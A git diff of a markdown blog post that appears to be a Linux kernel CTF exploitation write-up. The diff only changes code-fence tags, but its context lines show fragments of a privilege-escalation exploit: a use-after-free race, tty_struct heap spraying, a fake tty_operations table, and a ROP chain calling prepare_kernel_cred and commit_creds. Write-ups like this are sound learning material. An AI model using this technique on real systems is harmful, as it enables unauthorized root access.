@@ -19,7 +19,7 @@ We can see everything is enabled:
 * PTI
 * KASLR
 # Source code analysis
-```C
+```c
 
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -151,7 +151,7 @@ The vulnerability is a UAF which is caused by a race condition on releasing the 
 # Exploit
 ## Triggering the race
 Lets look on the following code:
-```C
+```c
 
 bool stop_running = false;
 
@@ -209,7 +209,7 @@ So, when we print it, if we won the race, we should see non-zeros:
 As we can see, in 2 cases of the loop, we printed 0x5401 which corresponds to a magic of `tty_struct.
 
 `tty_struct` definition for kernel 5.16.14 can be found [here](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/tty.h#L143)
-```C
+```c
 
 struct tty_struct {
 	int	magic;
@@ -297,7 +297,7 @@ We note the following:
 * At the end of the struct, there are 0x148 of "empty" bytes (all zeros) - remember those for later.
 ## Getting code execution
 As we can see the `tty_struct` has a `ops` pointer, which point to the following struct:
-```C
+```c
 
 struct tty_operations {
 	struct tty_struct * (*lookup)(struct tty_driver *driver,
@@ -376,7 +376,7 @@ To use the gadget, I crafted a fake `ops` table (containing 14 functions - all t
 ![Pasted image 20230916005818](https://github.com/0xAriana/blog/assets/121199478/466424f7-6c2f-4197-bbaa-0cff57be8448)
 
 I trigger the write callback by calling `write` to all the opened `tty_struct` file descriptors from the spraying phase:
-```C
+```c
 
     for (int i = 0; i < 0x100; ++i) {
         write(ptmx[i], dummy_buff, sizeof(dummy_buff));
@@ -415,7 +415,7 @@ This part is pretty standard:
 3. Call [swapgs_restore_regs_and_return_to_usermode](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/entry/entry_64.S) with the return user space context ready on the stack: RIP, CS, EFLAGS, RSP, SS.
 
 * At the beginning of main, I've set the context I want to return to in the function `setup_iretq_context`:
-```C
+```c
 
 unsigned long cs;
 unsigned long ss;
@@ -438,7 +438,7 @@ void setup_iretq_context() {
 ```
 
 The Rop looks something like this:
-```C
+```c
     unsigned long pe_and_ret_to_userspace_rop[] = {pop_rdi_address, 0, prepare_kernel_creds_f,
                                                    xchg_rdi_rax_address,
                                                    commit_creds_f, swapgs_restore_regs_and_return_to_usermode_address, rsp + 0x500,
@@ -453,7 +453,7 @@ The Rop looks something like this:
 
 ## Putting it all together
 Here's the final code:
-```C
+```c
 
 #include <stdio.h>
 #include <fcntl.h>
